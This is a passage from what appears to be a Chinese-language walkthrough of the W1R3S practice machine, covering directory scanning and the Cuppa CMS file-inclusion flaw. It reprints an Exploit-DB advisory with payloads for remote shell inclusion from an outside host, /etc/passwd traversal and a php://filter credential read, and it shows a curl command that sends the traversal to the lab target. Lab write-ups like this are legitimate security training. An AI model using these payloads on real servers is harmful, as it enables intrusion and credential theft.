+</span></span><span class="line"><span class="cl">[+] md5(md5($pass).$salt)
+</span></span><span class="line"><span class="cl">[+] md5(md5($pass).md5($salt))
+</span></span><span class="line"><span class="cl">[+] md5(md5($salt).$pass)
+</span></span><span class="line"><span class="cl">[+] md5(md5($salt).md5($pass))
+</span></span><span class="line"><span class="cl">[+] md5(md5($username.$pass).$salt)
+</span></span><span class="line"><span class="cl">[+] md5(md5(md5($pass)))
+</span></span><span class="line"><span class="cl">[+] md5(md5(md5(md5($pass))))
+</span></span><span class="line"><span class="cl">[+] md5(md5(md5(md5(md5($pass)))))
+</span></span><span class="line"><span class="cl">[+] md5(sha1($pass))
+</span></span><span class="line"><span class="cl">[+] md5(sha1(md5($pass)))
+</span></span><span class="line"><span class="cl">[+] md5(sha1(md5(sha1($pass))))
+</span></span><span class="line"><span class="cl">[+] md5(strtoupper(md5($pass)))
+</span></span><span class="line"><span class="cl">--------------------------------------------------
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>尝试md5解密</p>
+<p>​<img src="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-6TQdeiPYsD4KLVh-20250303144204-f3reivn.png" alt="">​</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">This is not a password
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>除两端疑似密文外，但是没有得到什么有价值的信息</p>
+<p>可以看到还存在相关的员工列表，通过相关的搜集可能获得部分更高权限，得到相关的立足点</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">The W1R3S.inc employee list
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Naomi.W - Manager
+</span></span><span class="line"><span class="cl">Hector.A - IT Dept
+</span></span><span class="line"><span class="cl">Joseph.G - Web Design
+</span></span><span class="line"><span class="cl">Albert.O - Web Design
+</span></span><span class="line"><span class="cl">Gina.L - Inventory
+</span></span><span class="line"><span class="cl">Rico.D - Human Resources
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后是一段明显是颠倒的信息，通过在线网站</p>
+<p><a href="https://www.upsidedowntext.com/">Upside Down Text | Flip Text, Type Upside Down, or Backwards Text</a></p>
+<p>​<img src="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-QfnGSkTIADLysR3-20250303144205-b55gtcz.png" alt="">​</p>
+<p>​<img src="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-zb9tBA3Plvj5Qio-20250303144205-8jl8gzu.png" alt="">​</p>
+<h2 id="mysql">MySQL</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/桌面]
+</span></span><span class="line"><span class="cl">└─$ mysql -h 192.168.152.132 -u root -p
+</span></span><span class="line"><span class="cl">Enter password: 
+</span></span><span class="line"><span class="cl">ERROR 1130 (HY000): Host &#39;192.168.152.131&#39; is not allowed to connect to this MySQL server
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>尝试空密码，但是很明显失败了</p>
+<h2 id="web渗透">Web渗透</h2>
+<p>当然，还有一个80端口，存在着web服务，是值得去尝试的</p>
+<p>打开后是一个基本的ubuntu服务器的页面</p>
+<p>​<img src="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-BIfNnmwtHxF3PAj-20250303144205-8b8h6ph.png" alt="">​</p>
+<p>进行目录爆破</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/桌面]
+</span></span><span class="line"><span class="cl">└─$ dirsearch -u http://192.168.152.132:80/                                  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  _|. _ _  _  _  _ _|_    v0.4.3                                                     
+</span></span><span class="line"><span class="cl"> (_||| _) (/_(_|| (_| )                                                                                  
+</span></span><span class="line"><span class="cl">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Output File: /home/kali/桌面/reports/http_192.168.152.132_80/__24-03-11_01-27-32.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Target: http://192.168.152.132/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[01:27:32] Starting:                                                                                
+</span></span><span class="line"><span class="cl">[01:27:33] 403 -  301B  - /.ht_wsr.txt                                  
+</span></span><span class="line"><span class="cl">[01:27:33] 403 -  304B  - /.htaccess.bak1                               
+</span></span><span class="line"><span class="cl">[01:27:33] 403 -  304B  - /.htaccess.orig                               
+</span></span><span class="line"><span class="cl">[01:27:33] 403 -  304B  - /.htaccess.save
+</span></span><span class="line"><span class="cl">[01:27:33] 403 -  304B  - /.htaccess_orig                               
+</span></span><span class="line"><span class="cl">[01:27:33] 403 -  302B  - /.htaccessBAK
+</span></span><span class="line"><span class="cl">[01:27:33] 403 -  302B  - /.htaccessOLD
+</span></span><span class="line"><span class="cl">[01:27:33] 403 -  306B  - /.htaccess.sample                             
+</span></span><span class="line"><span class="cl">[01:27:33] 403 -  305B  - /.htaccess_extra
+</span></span><span class="line"><span class="cl">[01:27:33] 403 -  302B  - /.htaccess_sc                                 
+</span></span><span class="line"><span class="cl">[01:27:33] 403 -  295B  - /.html
+</span></span><span class="line"><span class="cl">[01:27:33] 403 -  294B  - /.htm
+</span></span><span class="line"><span class="cl">[01:27:33] 403 -  303B  - /.htaccessOLD2
+</span></span><span class="line"><span class="cl">[01:27:33] 403 -  301B  - /.httr-oauth                                  
+</span></span><span class="line"><span class="cl">[01:27:33] 403 -  300B  - /.htpasswds
+</span></span><span class="line"><span class="cl">[01:27:33] 403 -  304B  - /.htpasswd_test                               
+</span></span><span class="line"><span class="cl">[01:27:34] 403 -  294B  - /.php                                         
+</span></span><span class="line"><span class="cl">[01:27:34] 403 -  295B  - /.php3                                        
+</span></span><span class="line"><span class="cl">[01:27:40] 301 -  326B  - /administrator  -&gt;  http://192.168.152.132/administrator/
+</span></span><span class="line"><span class="cl">[01:27:40] 302 -    7KB - /administrator/  -&gt;  installation/            
+</span></span><span class="line"><span class="cl">[01:27:40] 302 -    7KB - /administrator/index.php  -&gt;  installation/   
+</span></span><span class="line"><span class="cl">[01:27:51] 301 -  323B  - /javascript  -&gt;  http://192.168.152.132/javascript/
+</span></span><span class="line"><span class="cl">[01:28:01] 403 -  304B  - /server-status/                               
+</span></span><span class="line"><span class="cl">[01:28:01] 403 -  303B  - /server-status                                
+</span></span><span class="line"><span class="cl">[01:28:09] 200 -    1KB - /wordpress/wp-login.php                       
+</span></span><span class="line"><span class="cl">[01:28:09] 301 -    0B  - /wordpress/  -&gt;  http://localhost/wordpress/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过扫描明显看出存在wordpress和administrator的后台目录</p>
+<p>因此下面也就是两个方向</p>
+<h3 id="administrator">administrator</h3>
+<p>进入后发现应该是一个系统配置界面</p>
+<p>​<img src="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-yi4JbWmM6exZXgF-20250303144206-z660qao.png" alt="">​</p>
+<p>​<img src="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-47wUDMTedrtXcqK-20250303144206-3ls9i1w.png" alt="">​</p>
+<p><strong>注意</strong></p>
+<p>这里也存在一个问题，就是由于这个是一个靶机，所以对于相关操作没有太大心理压力，但是如果是真实环境，就可能担心会对系统及服务造成不可逆的损失，或者出现暴露，牢记，所有的测试要保证自身安全的情况下进行！</p>
+<p>​<img src="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-6lcTVkOa5qyUL29-20250303144206-p4042as.png" alt="">​</p>
+<p>无法对管理员进行新的创建，因此考虑查找其他方向</p>
+<h4 id="漏洞利用">漏洞利用</h4>
+<p>查找相关漏洞</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/桌面]
+</span></span><span class="line"><span class="cl">└─$ searchsploit cuppa cms                            
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl"> Exploit Title                                                        |  Path
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">Cuppa CMS - &#39;/alertConfigField.php&#39; Local/Remote File Inclusion       | php/webapps/25971.txt
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">Shellcodes: No Results
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将相关exp信息进行下载</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/桌面]
+</span></span><span class="line"><span class="cl">└─$ searchsploit cuppa -m 25971
+</span></span><span class="line"><span class="cl">[!] Could not find EDB-ID #
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Exploit: Cuppa CMS - &#39;/alertConfigField.php&#39; Local/Remote File Inclusion
+</span></span><span class="line"><span class="cl">      URL: https://www.exploit-db.com/exploits/25971
+</span></span><span class="line"><span class="cl">     Path: /usr/share/exploitdb/exploits/php/webapps/25971.txt
+</span></span><span class="line"><span class="cl">    Codes: OSVDB-94101
+</span></span><span class="line"><span class="cl"> Verified: True
+</span></span><span class="line"><span class="cl">File Type: C++ source, ASCII text, with very long lines (876)
+</span></span><span class="line"><span class="cl">Copied to: /home/kali/桌面/25971.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl"># Exploit Title   : Cuppa CMS File Inclusion
+</span></span><span class="line"><span class="cl"># Date            : 4 June 2013
+</span></span><span class="line"><span class="cl"># Exploit Author  : CWH Underground
+</span></span><span class="line"><span class="cl"># Site            : www.2600.in.th
+</span></span><span class="line"><span class="cl"># Vendor Homepage : http://www.cuppacms.com/
+</span></span><span class="line"><span class="cl"># Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip
+</span></span><span class="line"><span class="cl"># Version         : Beta
+</span></span><span class="line"><span class="cl"># Tested on       : Window and Linux
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  ,--^----------,--------,-----,-------^--,
+</span></span><span class="line"><span class="cl">  | |||||||||   `--------&#39;     |          O .. CWH Underground Hacking Team ..
+</span></span><span class="line"><span class="cl">  `+---------------------------^----------|
+</span></span><span class="line"><span class="cl">    `\_,-------, _________________________|
+</span></span><span class="line"><span class="cl">      / XXXXXX /`|     /
+</span></span><span class="line"><span class="cl">     / XXXXXX /  `\   /
+</span></span><span class="line"><span class="cl">    / XXXXXX /\______(
+</span></span><span class="line"><span class="cl">   / XXXXXX /
+</span></span><span class="line"><span class="cl">  / XXXXXX /
+</span></span><span class="line"><span class="cl"> (________(
+</span></span><span class="line"><span class="cl">  `------&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">####################################
+</span></span><span class="line"><span class="cl">VULNERABILITY: PHP CODE INJECTION
+</span></span><span class="line"><span class="cl">####################################
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/alerts/alertConfigField.php (LINE: 22)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-----------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">LINE 22:
+</span></span><span class="line"><span class="cl">        &lt;?php include($_REQUEST[&#34;urlConfig&#34;]); ?&gt;
+</span></span><span class="line"><span class="cl">-----------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#####################################################
+</span></span><span class="line"><span class="cl">DESCRIPTION
+</span></span><span class="line"><span class="cl">#####################################################
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#####################################################
+</span></span><span class="line"><span class="cl">EXPLOIT
+</span></span><span class="line"><span class="cl">#####################################################
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
+</span></span><span class="line"><span class="cl">http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Moreover, We could access Configuration.php source code via PHPStream
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">For Example:
+</span></span><span class="line"><span class="cl">-----------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
+</span></span><span class="line"><span class="cl">-----------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Base64 Encode Output:
+</span></span><span class="line"><span class="cl">-----------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+
+</span></span><span class="line"><span class="cl">-----------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Base64 Decode Output:
+</span></span><span class="line"><span class="cl">-----------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">	class Configuration{
+</span></span><span class="line"><span class="cl">		public $host = &#34;localhost&#34;;
+</span></span><span class="line"><span class="cl">		public $db = &#34;cuppa&#34;;
+</span></span><span class="line"><span class="cl">		public $user = &#34;root&#34;;
+</span></span><span class="line"><span class="cl">		public $password = &#34;Db@dmin&#34;;
+</span></span><span class="line"><span class="cl">		public $table_prefix = &#34;cu_&#34;;
+</span></span><span class="line"><span class="cl">		public $administrator_template = &#34;default&#34;;
+</span></span><span class="line"><span class="cl">		public $list_limit = 25;
+</span></span><span class="line"><span class="cl">		public $token = &#34;OBqIPqlFWf3X&#34;;
+</span></span><span class="line"><span class="cl">		public $allowed_extensions = &#34;*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx&#34;;
+</span></span><span class="line"><span class="cl">		public $upload_default_path = &#34;media/uploadsFiles&#34;;
+</span></span><span class="line"><span class="cl">		public $maximum_file_size = &#34;5242880&#34;;
+</span></span><span class="line"><span class="cl">		public $secure_login = 0;
+</span></span><span class="line"><span class="cl">		public $secure_login_value = &#34;&#34;;
+</span></span><span class="line"><span class="cl">		public $secure_login_redirect = &#34;&#34;;
+</span></span><span class="line"><span class="cl">	}
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl">-----------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Able to read sensitive information via File Inclusion (PHP Stream)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">################################################################################################################
+</span></span><span class="line"><span class="cl"> Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2
+</span></span><span class="line"><span class="cl">################################################################################################################
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>随后，在根据上述信息，查看/etc/passwd</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>​<img src="https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-PLhy8UgoW3N9bOj-20250303144206-l06wwcw.png" alt="">​</p>
+<p>路径没问题，但是无法显示，因此在尝试下一种方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/桌面]
+</span></span><span class="line"><span class="cl">└─$ curl --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.152.132/administrator/alerts/alertConfigField.php 
+</span></span><span class="line"><span class="cl">&lt;style&gt;
+</span></span><span class="line"><span class="cl">    .new_content{
+</span></span><span class="line"><span class="cl">        position: fixed;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    .alert_config_field{
+</span></span><span class="line"><span class="cl">        font-size:12px;
+</span></span><span class="line"><span class="cl">        background:#FFF;
+</span></span><span class="line"><span class="cl">        position:relative;
+</span></span><span class="line"><span class="cl">        border-radius: 3px;
+</span></span><span class="line"><span class="cl">        box-shadow: 0px 0px 5px rgba(0,0,0,0.2);
+</span></span><span class="line"><span class="cl">        overflow:hidden;
+</span></span><span class="line"><span class="cl">        position:fixed;
+</span></span><span class="line"><span class="cl">        top:50%;
+</span></span><span class="line"><span class="cl">        left:50%;
+</span></span><span class="line"><span class="cl">        width:600px;
+</span></span><span class="line"><span class="cl">        height:440px;
+</span></span><span class="line"><span class="cl">        margin-left:-300px;
+</span></span><span class="line"><span class="cl">        margin-top:-220px;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    .alert_config_top{
+</span></span><span class="line"><span class="cl">        position: relative;
+</span></span><span class="line"><span class="cl">        margin: 2px;
+</span></span><span class="line"><span class="cl">        margin-bottom: 0px;
+</span></span><span class="line"><span class="cl">        border: 1px solid #D2D2D2;
+</span></span><span class="line"><span class="cl">        background: #4489F8;
+</span></span><span class="line"><span class="cl">        overflow: auto;
+</span></span><span class="line"><span class="cl">        color:#FFF;
+</span></span><span class="line"><span class="cl">        font-size: 13px;
+</span></span><span class="line"><span class="cl">        padding: 7px 5px;
+</span></span><span class="line"><span class="cl">        box-shadow: 0 0 2px rgba(0, 0, 0, 0.1);
+</span></span><span class="line"><span class="cl">        text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    .description_alert{
+</span></span><span class="line"><span class="cl">        position:relative;
+</span></span><span class="line"><span class="cl">        font-size:12px;
+</span></span><span class="line"><span class="cl">        text-shadow:0 1px #FFFFFF;
+</span></span><span class="line"><span class="cl">        font-weight: normal;
+</span></span><span class="line"><span class="cl">        padding: 5px 0px 5px 0px;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    .btnClose_alert{
+</span></span><span class="line"><span class="cl">        position:absolute;
+</span></span><span class="line"><span class="cl">        top: 4px; right: 2px;
